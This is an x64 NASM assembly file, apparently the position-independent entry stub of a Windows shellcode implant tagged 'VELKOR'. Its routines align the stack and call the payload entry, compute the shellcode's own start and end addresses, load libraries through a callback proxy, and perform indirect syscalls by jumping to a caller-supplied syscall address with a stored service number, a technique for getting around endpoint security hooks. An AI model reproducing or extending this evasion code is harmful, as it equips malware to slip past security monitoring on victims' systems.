[BITS 64]

DEFAULT REL
EXTERN Entry
EXTERN LoadLibraryPtr

EXTERN SyscallAddr  
EXTERN SysSrvNumber 

GLOBAL Start
GLOBAL CallbackLoadLib

GLOBAL StartPtr
GLOBAL RetStartPtr

GLOBAL RetEndPtr
GLOBAL EndPtr

GLOBAL SetSsn
GLOBAL SyscallExec

[SECTION .global] 
    SyscallAddr    dq 0 
    SysSrvNumber   dq 0 

[SECTION .text$A]
    Start:
        push  rsi
        mov   rsi, rsp
        and   rsp, 0FFFFFFFFFFFFFFF0h
        sub   rsp, 0x20
        call  Entry
        mov   rsp, rsi
        pop   rsi
        ret

    StartPtr:
        call RetStartPtr
        ret

    RetStartPtr:
        mov   rax, [rsp]
        sub   rax, 0x1b  
        ret           

[SECTION .text$B]
    CallbackLoadLib:
        mov rcx, rdx
        xor rdx, rdx
        call LoadLibraryPtr
        jmp rax

    SetSsn:
        mov rax, 0x00           
        mov [SysSrvNumber], rax

        mov rax, 0x00           
        mov [SyscallAddr], rax 

        mov rax, rcx            
        mov [SysSrvNumber], rax

        mov rax, rdx            
        mov [SyscallAddr], rax 
        ret

    SyscallExec:
        mov r10, rcx
        mov eax, [SysSrvNumber] 
        jmp [SyscallAddr]       
        ret

[SECTION .text$E]
    EndPtr:
        call RetEndPtr
        ret

    RetEndPtr:
        mov rax, [rsp]
        add   rax, 0xB  
        ret            

[SECTION .text$P]
    VelkorEndStr:
        DB 'V', 'E', 'L', 'K', 'O', 'R'

